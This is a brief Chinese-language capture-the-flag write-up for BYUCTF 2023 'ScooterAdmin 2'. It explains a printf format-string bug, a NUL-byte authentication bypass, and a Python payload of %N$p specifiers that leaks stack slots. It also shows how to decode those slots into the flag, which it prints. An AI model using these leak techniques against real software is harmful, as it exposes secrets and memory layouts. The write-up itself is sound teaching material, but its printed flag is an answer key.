# BYUCTF 2023 - ScooterAdmin 2

## 题目简述

通过第一题认证后，调试功能把用户提供的字符串直接交给 `printf(fetchstring)`。第二个 flag 已由 `main` 读入栈中，因此格式化字符串可把它作为参数槽泄漏。

## 解题过程

先用 NUL 字节绕过认证，然后选择菜单项 3。官方环境中 flag 位于第 `2094` 至 `2098` 个位置，可一次请求：

```python
payload = b'----'
for i in range(2094, 2099):
    payload += b'%%%d$p.' % i
```

每个 `%p` 输出一个 64 位栈值。x86-64 为小端序，要把每组十六进制补足 16 位、转成 8 字节并反转，再按顺序拼接：

```python
flag += bytearray.fromhex(word.zfill(16)).decode()[::-1]
```

恢复结果为：

```text
byuctf{OhNoYouCanReadButCanYouWrite?}
```

## 方法总结

格式化字符串的读原语常用于泄漏栈、PIE、libc 和秘密数据。参数序号依赖编译与调用栈，可靠流程是先在同版本环境枚举 `%1$p` 起的槽位，再缩小到连续的 flag 区间并处理端序。
